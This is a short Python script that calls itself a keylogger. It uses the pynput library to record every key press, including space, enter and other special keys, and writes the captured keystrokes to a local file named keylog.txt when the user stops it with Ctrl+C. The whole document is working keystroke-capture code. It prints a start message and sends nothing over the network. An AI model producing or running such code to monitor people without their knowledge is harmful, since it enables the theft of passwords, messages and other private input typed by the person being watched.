import pynput.keyboard

# Create a list to store the logged keys
keys_logged = []

# Define a function to handle key press events
def on_press(key):
    try:
        # Convert the key object to a string
        key_str = str(key.char)
    except AttributeError:
        # Handle special keys (e.g., space, enter, backspace)
        if key == pynput.keyboard.Key.space:
            key_str = " "
        elif key == pynput.keyboard.Key.enter:
            key_str = "\n"
        else:
            key_str = f" {key} "

    # Append the key to the list
    keys_logged.append(key_str)

# Define a function to write the logged keys to a file
def write_to_file(file_path):
    with open(file_path, "w") as log_file:
        log_file.write("".join(keys_logged))

# Create a keyboard listener
listener = pynput.keyboard.Listener(on_press=on_press)

# Start the keyboard listener
print("Keylogger started. Press Ctrl+C to stop.")
listener.start()

try:
    # Keep the program running until interrupted
    while True:
        pass
except KeyboardInterrupt:
    # Stop the keyboard listener and write the logged keys to a file
    listener.stop()
    file_path = "keylog.txt"
    write_to_file(file_path)
    print(f"Logged keys saved to {file_path}")